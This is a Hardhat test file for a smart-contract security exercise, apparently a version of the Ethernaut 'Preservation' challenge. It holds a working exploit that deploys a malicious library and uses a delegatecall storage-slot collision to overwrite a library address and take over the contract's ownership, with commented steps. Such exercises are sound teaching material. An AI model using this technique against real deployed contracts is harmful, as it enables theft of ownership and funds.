const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Exercise 16 - Preservation", function () {

    let deployer, attacker;

    beforeEach(async function () {
        [deployer, attacker] = await ethers.getSigners();

        const LibraryContract1 = await ethers.getContractFactory("LibraryContract");
        this.libraryContract1 = await LibraryContract1.deploy();
        await this.libraryContract1.deployed();

        const LibraryContract2 = await ethers.getContractFactory("LibraryContract");
        this.libraryContract2 = await LibraryContract2.deploy();
        await this.libraryContract2.deployed();

        const Preservation = await ethers.getContractFactory("Preservation");
        this.contract = await Preservation.deploy(this.libraryContract1.address, this.libraryContract2.address);

        await this.contract.deployed();

        expect(await this.contract.owner()).to.be.eq(deployer.address);
    });


    it("Claim ownership", async function () {
        // 1- Deploy a Malicious library that will change the owner of the contract
        const MaliciousLib = await ethers.getContractFactory("MaliciousLib", attacker);
        const maliciousLibContract = await MaliciousLib.deploy();
        await maliciousLibContract.deployed();

        // 2- use the malicious contract address (as uint) as timeStamp parameter for setTime function (anyone)
        // These libraries contract, when modifying the storedTime variable, are modifying also the first storage slot of
        // the main contract. This first slot is the timeZone1Library. So we are editing the timeZone1Library address to point to
        // our malicious contract
        const addressAsUint = (ethers.BigNumber.from(maliciousLibContract.address)).toString();
        const setTx = await this.contract.connect(attacker).setFirstTime(addressAsUint);
        await setTx.wait();

        // 3- Call the setTime function in the malicious contract setFirstTime()
        // This will make the attacker the owner
        const set2Tx = await this.contract.connect(attacker).setFirstTime(1);
        await set2Tx.wait();

        expect(await this.contract.owner()).to.be.eq(attacker.address);
    });

});

